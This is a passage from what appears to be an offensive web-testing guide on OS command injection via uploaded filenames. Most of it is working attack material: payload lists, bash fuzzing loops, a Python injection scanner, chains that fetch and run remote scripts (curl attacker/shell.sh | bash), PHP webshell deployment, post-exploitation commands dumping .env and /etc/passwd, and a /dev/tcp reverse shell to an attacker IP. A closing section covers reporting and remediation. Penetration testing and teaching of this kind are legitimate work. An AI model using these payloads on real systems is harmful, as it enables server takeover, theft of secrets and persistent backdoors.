          INDICATOR="★"
      elif [ "$STATUS" = "500" ]; then
          INDICATOR="!"
      fi

      printf "  [%s] [%s] %s\n" "$INDICATOR" "$STATUS" "$payload"
  done

  rm -f /tmp/bypass_img.jpg /tmp/bp_resp.txt
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="Quote Context Escape"}
  ```bash
  # When the filename is placed inside quotes in the shell command:
  # exec("convert '/tmp/$filename' '/uploads/thumb_$filename'");
  # You need to break out of the quote context first

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/quote_img.jpg

  echo "═══ Quote Escape Payloads ═══"

  QUOTE_PAYLOADS=(
      # Breaking out of single quotes
      "test'; id; echo '.jpg"
      "test'; id; #.jpg"
      "test'; cat /etc/passwd; echo '.jpg"
      "test'%0aid%0a'.jpg"

      # Breaking out of double quotes
      'test"; id; echo ".jpg'
      'test"; id; #.jpg'
      'test"; cat /etc/passwd; echo ".jpg'

      # Breaking out of backticks
      'test`; id; echo `.jpg'

      # Mixed quoting
      "test'; id; \".jpg"
      'test"; id; '"'"'.jpg'

      # Inside $() substitution with quotes
      'test$(id)"".jpg'
      "test\$(id)''.jpg"

      # Backslash escape bypass
      'test\'; id ;.jpg'
      'test\\"; id ;.jpg'
  )

  for payload in "${QUOTE_PAYLOADS[@]}"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
        -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/quote_img.jpg;filename=${payload}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      printf "  [%s] %s\n" "$STATUS" "$payload"
  done

  rm -f /tmp/quote_img.jpg
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="Filename Length & Encoding Tricks"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/enc_img.jpg

  echo "═══ Encoding & Length Tricks ═══"

  ENC_PAYLOADS=(
      # URL-encoded separators
      'test%3Bid%3B.jpg'           # ; → %3B
      'test%7Cid.jpg'              # | → %7C
      'test%26id%26.jpg'           # & → %26
      'test%24(id).jpg'            # $ → %24

      # Double URL encoding
      'test%253Bid%253B.jpg'       # ; → %253B
      'test%257Cid.jpg'            # | → %257C

      # Unicode encoding
      'test%EF%BC%9Bid%EF%BC%9B.jpg'  # fullwidth semicolon

      # Overlong UTF-8
      'test%C0%BBid%C0%BB.jpg'

      # Very long filename (buffer overflow potential)
      "$(python3 -c "print('A'*5000 + ';id;' + 'B'*100 + '.jpg')")"

      # Null byte truncation (if filename is processed as C string)
      'test.jpg%00;id;'
      'test.jpg\x00;id;'
  )

  for payload in "${ENC_PAYLOADS[@]}"; do
      DISPLAY=$(echo "$payload" | head -c 60)
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
        -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/enc_img.jpg;filename=${payload}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      echo "[${STATUS}] ${DISPLAY}..."
  done

  rm -f /tmp/enc_img.jpg
  ```
  :::
::

---

## Comprehensive Filename Injection Scanner

::code-collapse
```python [filename_injection_scanner.py]
#!/usr/bin/env python3
"""
Filename Command Injection Scanner
Tests 200+ filename payloads with time-based, OOB, and response-based detection.
"""
import requests
import time
import sys
import urllib3
urllib3.disable_warnings()

class FilenameInjectionScanner:

    COLLAB = "YOUR_COLLAB_ID.oastify.com"  # Change this

    # Payload categories
    LINUX_BASIC = [
        ('; id ;.jpg', 'semicolon'),
        ('| id.jpg', 'pipe'),
        ('& id &.jpg', 'ampersand'),
        ('&& id.jpg', 'and'),
        ('|| id.jpg', 'or'),
        ('`id`.jpg', 'backtick'),
        ('$(id).jpg', 'dollar'),
    ]

    LINUX_ADVANCED = [
        ('; id #.jpg', 'semi_hash'),
        ('%0aid%0a.jpg', 'newline'),
        ('%0d%0aid%0d%0a.jpg', 'crlf'),
        ("'; id; '.jpg", 'single_quote_escape'),
        ('"; id; ".jpg', 'double_quote_escape'),
        (';cat${IFS}/etc/passwd;.jpg', 'ifs_space'),
        (';cat$IFS/etc/passwd;.jpg', 'ifs_noquote'),
        (';{cat,/etc/passwd};.jpg', 'brace_expansion'),
        (';cat</etc/passwd;.jpg', 'redirect_read'),
        (';c""at /etc/passwd;.jpg', 'empty_quotes'),
        (";c''at /etc/passwd;.jpg", 'single_empty'),
        (';c\\at /etc/passwd;.jpg', 'backslash_insert'),
        (';/???/??t /???/??ss??;.jpg', 'wildcard_glob'),
    ]

    WINDOWS_BASIC = [
        ('& whoami &.jpg', 'win_amp'),
        ('| whoami.jpg', 'win_pipe'),
        ('&& whoami.jpg', 'win_and'),
        ('|| whoami.jpg', 'win_or'),
        ('& net user &.jpg', 'win_netuser'),
    ]

    TIME_BASED = [
        ('; sleep 5 ;.jpg', 'sleep_semi', 5),
        ('| sleep 5.jpg', 'sleep_pipe', 5),
        ('`sleep 5`.jpg', 'sleep_backtick', 5),
        ('$(sleep 5).jpg', 'sleep_dollar', 5),
        ('; ping -c 5 127.0.0.1 ;.jpg', 'ping_semi', 5),
        ('& ping -n 5 127.0.0.1 &.jpg', 'ping_win', 5),
    ]

    def __init__(self, upload_url, field="file", cookies=None):
        self.upload_url = upload_url
        self.field = field
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 20
        if cookies:
            self.session.cookies.update(cookies)
        self.results = {'confirmed': [], 'probable': [], 'possible': []}

        # Create valid JPEG content
        self.image_content = (
            b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00'
            b'\x00\x01\x00\x01\x00\x00\xff\xd9'
        )

    def upload(self, filename):
        """Upload image with given filename"""
        files = {self.field: (filename, self.image_content, 'image/jpeg')}
        try:
            start = time.time()
            r = self.session.post(self.upload_url, files=files, timeout=20)
            elapsed = time.time() - start
            return r.status_code, r.text, elapsed
        except requests.exceptions.Timeout:
            return 0, 'TIMEOUT', 20.0
        except Exception as e:
            return 0, str(e), 0

    def get_baseline(self):
        """Get baseline response for comparison"""
        status, text, elapsed = self.upload('normal_test.jpg')
        return {'status': status, 'size': len(text), 'time': elapsed, 'text': text}

    def check_response_indicators(self, text):
        """Check for command execution indicators in response"""
        indicators = [
            ('uid=', 'id command output'),
            ('root:', '/etc/passwd content'),
            ('www-data', 'web server user'),
            ('Linux ', 'uname output'),
            ('Darwin ', 'macOS uname'),
            ('MINGW', 'Windows Git Bash'),
            ('NT AUTHORITY', 'Windows user'),
            ('Administrator', 'Windows admin'),
            ('command not found', 'shell error'),
            ('sh:', 'shell path error'),
            ('bash:', 'bash error'),
            ('syntax error', 'shell syntax error'),
            ('Permission denied', 'shell permission error'),
            ('No such file', 'shell file error'),
        ]
        for pattern, desc in indicators:
            if pattern in text:
                return True, desc
        return False, None

    def scan(self, delay=0.3):
        """Run comprehensive filename injection scan"""
        print(f"\n{'='*60}")
        print(f" Filename Command Injection Scanner")
        print(f"{'='*60}")
        print(f"[*] Target: {self.upload_url}")

        baseline = self.get_baseline()
        print(f"[*] Baseline: status={baseline['status']} size={baseline['size']} time={baseline['time']:.2f}s")
        print("-" * 60)

        # Response-based detection
        print("\n[*] Phase 1: Response-based detection (Linux)")
        for payload, name in self.LINUX_BASIC + self.LINUX_ADVANCED:
            status, text, elapsed = self.upload(payload)
            found, desc = self.check_response_indicators(text)

            if found:
                self.results['confirmed'].append({'payload': payload, 'name': name, 'detail': desc})
                print(f"  [★] CONFIRMED: {name:25s} → {desc}")
            elif status == 500 or abs(len(text) - baseline['size']) > 200:
                self.results['possible'].append({'payload': payload, 'name': name, 'status': status})
                print(f"  [!] POSSIBLE:  {name:25s} → status={status} size_diff={len(text)-baseline['size']}")

            time.sleep(delay)

        print("\n[*] Phase 2: Response-based detection (Windows)")
        for payload, name in self.WINDOWS_BASIC:
            status, text, elapsed = self.upload(payload)
            found, desc = self.check_response_indicators(text)
            if found:
                self.results['confirmed'].append({'payload': payload, 'name': name, 'detail': desc})
                print(f"  [★] CONFIRMED: {name:25s} → {desc}")
            time.sleep(delay)

        # Time-based detection
        print("\n[*] Phase 3: Time-based detection")
        for payload, name, expected_delay in self.TIME_BASED:
            status, text, elapsed = self.upload(payload)
            time_diff = elapsed - baseline['time']

            if time_diff > (expected_delay * 0.7):
                self.results['probable'].append({
                    'payload': payload, 'name': name,
                    'detail': f'delayed {elapsed:.1f}s (expected ~{expected_delay}s)'
                })
                print(f"  [★] PROBABLE:  {name:25s} → {elapsed:.1f}s delay (baseline: {baseline['time']:.1f}s)")
            else:
                print(f"  [-] {name:25s} → {elapsed:.1f}s (no delay)")

            time.sleep(delay)

        # OOB detection
        print(f"\n[*] Phase 4: OOB detection (check {self.COLLAB})")
        oob_payloads = [
            (f'; nslookup fn-semi.{self.COLLAB} ;.jpg', 'oob_semi'),
            (f'`nslookup fn-bt.{self.COLLAB}`.jpg', 'oob_backtick'),
            (f'$(nslookup fn-dollar.{self.COLLAB}).jpg', 'oob_dollar'),
            (f'| nslookup fn-pipe.{self.COLLAB} |.jpg', 'oob_pipe'),
            (f'; curl http://{self.COLLAB}/fn-curl ;.jpg', 'oob_curl'),
        ]
        for payload, name in oob_payloads:
            status, text, elapsed = self.upload(payload)
            print(f"  [?] {name:25s} → [{status}] (check collaborator)")
            time.sleep(delay)

        # Summary
        print(f"\n{'='*60}")
        print(f" RESULTS")
        print(f"{'='*60}")
        print(f"Confirmed: {len(self.results['confirmed'])}")
        print(f"Probable:  {len(self.results['probable'])}")
        print(f"Possible:  {len(self.results['possible'])}")

        if self.results['confirmed']:
            print(f"\n[★] CONFIRMED Command Injection:")
            for r in self.results['confirmed']:
                print(f"    Payload: {r['payload']}")
                print(f"    Detail:  {r['detail']}")
                print()

        if self.results['probable']:
            print(f"\n[!] PROBABLE (time-based):")
            for r in self.results['probable']:
                print(f"    Payload: {r['payload']}")
                print(f"    Detail:  {r['detail']}")
                print()

        return self.results


if __name__ == "__main__":
    scanner = FilenameInjectionScanner(
        upload_url="https://target.com/api/upload",
        field="file",
        cookies={"session": "AUTH_TOKEN"},
    )
    # Set your collaborator domain
    scanner.COLLAB = "YOUR_COLLAB_ID.oastify.com"
    scanner.scan(delay=0.5)
```
::

---

## Exploitation Chains

::card-group
  :::card
  ---
  icon: i-lucide-link
  title: Filename → ImageMagick → RCE
  ---
  1. Application resizes uploaded images using `convert`
  2. Filename: `; curl http://attacker/shell.sh | bash ;.jpg`
  3. Server runs: `convert /tmp/; curl .../shell.sh | bash ;.jpg ...`
  4. Shell script downloads and executes → reverse shell
  5. Full RCE through image processing pipeline
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Filename → ExifTool → RCE
  ---
  1. Application extracts EXIF data via CLI `exiftool`
  2. Filename: `` `curl attacker/shell.sh|bash`.jpg ``
  3. Server runs: `` exiftool /uploads/`curl .../shell.sh|bash`.jpg ``
  4. Backtick command substitution executes before exiftool
  5. CVE-2021-22204 (ExifTool) also exploitable via content
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Filename → FFmpeg → RCE
  ---
  1. Application creates video thumbnails with FFmpeg
  2. Filename: `$(curl attacker/rev.sh|bash).mp4`
  3. Server runs: `ffmpeg -i /uploads/$(curl .../rev.sh|bash).mp4 ...`
  4. Command substitution fires before FFmpeg processes
  5. Reverse shell established
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Filename → mv/cp → Write Webshell
  ---
  1. Application moves uploaded files using shell `mv`
  2. Filename: `; echo '<?php system(\$_GET[cmd]); ?>' > /var/www/html/cmd.php ;.jpg`
  3. The `mv` command fails, but the `echo` command writes a webshell
  4. Access `cmd.php?cmd=id` for persistent RCE
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Filename → Logging → Log Poisoning → RCE
  ---
  1. Filename containing PHP code is logged to a file
  2. Filename: `<?php system($_GET['cmd']); ?>.jpg`
  3. Application writes filename to `/var/log/uploads.log`
  4. If the log file is included via LFI, PHP executes
  5. Chain: filename injection → log poisoning → LFI → RCE
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Filename → ClamAV Scan → RCE
  ---
  1. Application scans uploads with `clamscan $filename`
  2. Filename: `; id ;.jpg`
  3. ClamAV command injection executes before scan
  4. RCE through antivirus processing
  :::
::

---

## Verification & Post-Exploitation

::tabs
  :::tabs-item{icon="i-lucide-check-circle" label="Confirm Command Execution"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  COLLAB="YOUR_COLLAB_ID.oastify.com"

  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/verify.jpg

  echo "═══ Command Execution Verification ═══"

  # Method 1: Check response for command output
  echo "[*] Method 1: Response-based"
  RESP=$(curl -s -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/verify.jpg;filename=; id ;.jpg" \
    -H "Cookie: $COOKIE" 2>/dev/null)
  echo "$RESP" | grep -oE "uid=[0-9]+\([^ ]+\)" && echo "    [★] id output found!"

  # Method 2: Time-based
  echo "[*] Method 2: Time-based"
  TIME_NORMAL=$(curl -s -o /dev/null -w "%{time_total}" -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/verify.jpg;filename=normal.jpg" -H "Cookie: $COOKIE")
  TIME_SLEEP=$(curl -s -o /dev/null -w "%{time_total}" --max-time 15 -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/verify.jpg;filename=; sleep 5 ;.jpg" -H "Cookie: $COOKIE")
  echo "    Normal: ${TIME_NORMAL}s | Sleep: ${TIME_SLEEP}s"
  echo "    Difference: $(echo "$TIME_SLEEP - $TIME_NORMAL" | bc)s"

  # Method 3: OOB callback
  echo "[*] Method 3: OOB callback"
  curl -s -o /dev/null -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/verify.jpg;filename=; nslookup verify-rce.${COLLAB} ;.jpg" \
    -H "Cookie: $COOKIE"
  echo "    Check ${COLLAB} for 'verify-rce' DNS query"

  # Method 4: Write file and verify
  echo "[*] Method 4: File write verification"
  MARKER="FN_INJECTION_$(date +%s)"
  curl -s -o /dev/null -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/verify.jpg;filename=; echo ${MARKER} > /var/www/html/uploads/fn_verify.txt ;.jpg" \
    -H "Cookie: $COOKIE"
  sleep 1
  VERIFY=$(curl -s "https://target.com/uploads/fn_verify.txt" 2>/dev/null)
  if echo "$VERIFY" | grep -q "$MARKER"; then
      echo "    [★] FILE WRITE CONFIRMED — RCE verified!"
  fi

  # Method 5: Write webshell for persistent access
  echo "[*] Method 5: Webshell deployment"
  curl -s -o /dev/null -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/verify.jpg;filename=; echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/uploads/fn_shell.php ;.jpg" \
    -H "Cookie: $COOKIE"
  sleep 1
  curl -s "https://target.com/uploads/fn_shell.php?cmd=id" | grep "uid=" && \
      echo "    [★] WEBSHELL DEPLOYED — Persistent RCE!"

  rm -f /tmp/verify.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-check-circle" label="Post-Exploitation via Filename"}
  ```bash
  # ═══════════════════════════════════════════════
  # Once injection is confirmed, escalate through filenames
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  ATTACKER="10.10.14.1"

  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/post.jpg

  # System enumeration
  curl -s -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/post.jpg;filename=; id > /var/www/html/uploads/sysinfo.txt; uname -a >> /var/www/html/uploads/sysinfo.txt; cat /etc/os-release >> /var/www/html/uploads/sysinfo.txt ;.jpg" \
    -H "Cookie: $COOKIE"
  curl -s "https://target.com/uploads/sysinfo.txt"

  # Sensitive file extraction
  curl -s -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/post.jpg;filename=; cat /var/www/html/.env > /var/www/html/uploads/env.txt ;.jpg" \
    -H "Cookie: $COOKIE"
  curl -s "https://target.com/uploads/env.txt"

  # Network recon
  curl -s -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/post.jpg;filename=; ip addr > /var/www/html/uploads/net.txt; ss -tlnp >> /var/www/html/uploads/net.txt; cat /etc/hosts >> /var/www/html/uploads/net.txt ;.jpg" \
    -H "Cookie: $COOKIE"
  curl -s "https://target.com/uploads/net.txt"

  # Deploy persistent webshell
  curl -s -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/post.jpg;filename=; echo '<?php echo \"<pre>\".shell_exec(\$_REQUEST[\"cmd\"]).\"</pre>\"; ?>' > /var/www/html/uploads/shell.php ;.jpg" \
    -H "Cookie: $COOKIE"
  curl -s "https://target.com/uploads/shell.php?cmd=id"

  # Reverse shell upgrade
  # Start: nc -lvnp 4444
  curl -s -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/post.jpg;filename=; bash -c 'bash -i >& /dev/tcp/${ATTACKER}/4444 0>&1' ;.jpg" \
    -H "Cookie: $COOKIE"

  rm -f /tmp/post.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-check-circle" label="Safe PoC for Reports"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  TIMESTAMP=$(date +%s)
  COLLAB="YOUR_COLLAB_ID.oastify.com"

  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/poc.jpg

  echo "═══ Non-Destructive PoC ═══"

  # Option A: DNS callback (safest — no file writes, no data access)
  curl -s -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/poc.jpg;filename=; nslookup fn-poc-${TIMESTAMP}.${COLLAB} ;.jpg" \
    -H "Cookie: $COOKIE"

  # Option B: Write harmless marker file
  curl -s -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/poc.jpg;filename=; echo FILENAME_INJECTION_POC_${TIMESTAMP} > /var/www/html/uploads/fn_poc_${TIMESTAMP}.txt ;.jpg" \
    -H "Cookie: $COOKIE"
  sleep 1
  curl -s "https://target.com/uploads/fn_poc_${TIMESTAMP}.txt"

  # Option C: Time-based (no artifacts)
  TIME=$(curl -s -o /dev/null -w "%{time_total}" --max-time 15 -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/poc.jpg;filename=; sleep 5 ;.jpg" \
    -H "Cookie: $COOKIE")
  echo "Response time with sleep: ${TIME}s (normal ~0.5s)"

  echo ""
  echo "═══ Report ═══"
  echo "Title: OS Command Injection via Uploaded Filename at [endpoint]"
  echo "Severity: Critical (CVSS 9.8)"
  echo "CWE: CWE-78 (Improper Neutralization of Special Elements in OS Command)"
  echo "Endpoint: POST ${UPLOAD_URL##*/}"
  echo "Vector: Shell metacharacters in filename passed to server-side command"
  echo "PoC ID: ${TIMESTAMP}"
  echo ""
  echo "Reproduction:"
  echo '  curl -X POST "'"$UPLOAD_URL"'" \'
  echo '    -F "file=@image.jpg;filename=; sleep 5 ;.jpg" \'
  echo '    -H "Cookie: session=TOKEN"'
  echo '  # Response delayed by ~5 seconds → command injection confirmed'

  rm -f /tmp/poc.jpg
  ```
  :::
::

---

## Reporting & Remediation

### Reporting Best Practices

::steps{level="4"}

#### Title
`OS Command Injection via Uploaded Filename in [Image Processing / File Handling] at [Endpoint]`

#### Root Cause
The application passes user-supplied filenames directly to OS shell commands (via `exec()`, `system()`, `os.system()`, backticks, or `child_process.exec()`) without sanitizing shell metacharacters. The filename from `Content-Disposition` in the multipart upload is concatenated into a shell command string used for [image resizing / file moving / virus scanning / metadata extraction].

#### Reproduction
```bash
# Upload image with command injection in filename
curl -X POST "https://target.com/api/upload" \
  -F "file=@image.jpg;filename=; sleep 5 ;.jpg" \
  -H "Cookie: session=TOKEN"
# Response delayed ~5 seconds → command executed
```

#### Impact
An authenticated attacker can execute arbitrary operating system commands on the server by uploading any file with shell metacharacters in the filename. This leads to complete server compromise including data exfiltration, lateral movement, and persistent backdoor installation.

::

### Remediation

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Never Pass Filenames to Shell Commands
  ---
  Use language-native functions instead of shell commands. Replace `exec("mv ...")` with `rename()` (PHP), `shutil.move()` (Python), `fs.rename()` (Node.js). For image processing, use library bindings (Pillow, GD, Sharp) instead of CLI tools.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Generate Server-Side Filenames
  ---
  Never use the client-provided filename for any operation. Generate a random filename on the server: `uuid4() + '.jpg'`. Store the original name in the database if needed for display, but never use it in filesystem or command operations.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Use escapeshellarg() / shlex.quote()
  ---
  If you must pass filenames to commands, use proper escaping functions. PHP: `escapeshellarg($filename)`. Python: `shlex.quote(filename)`. These wrap the argument in single quotes and escape any embedded quotes.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Use Array-Based Execution
  ---
  Instead of string-based command execution, use array-based APIs that bypass the shell entirely. Python: `subprocess.run(['convert', filename, ...], shell=False)`. Node.js: `execFile('convert', [filename, ...])`. This prevents metacharacter interpretation.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Strict Filename Validation
  ---
  If the original filename must be preserved, validate it against a strict whitelist pattern: `^[a-zA-Z0-9_.-]+$`. Reject any filename containing characters outside this set. Strip or reject all shell metacharacters.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Sandboxed Processing
  ---
  Run file processing operations in isolated containers or sandboxes with minimal permissions. Even if command injection occurs, the attacker is confined to a restricted environment with no access to sensitive data or network.
  :::
::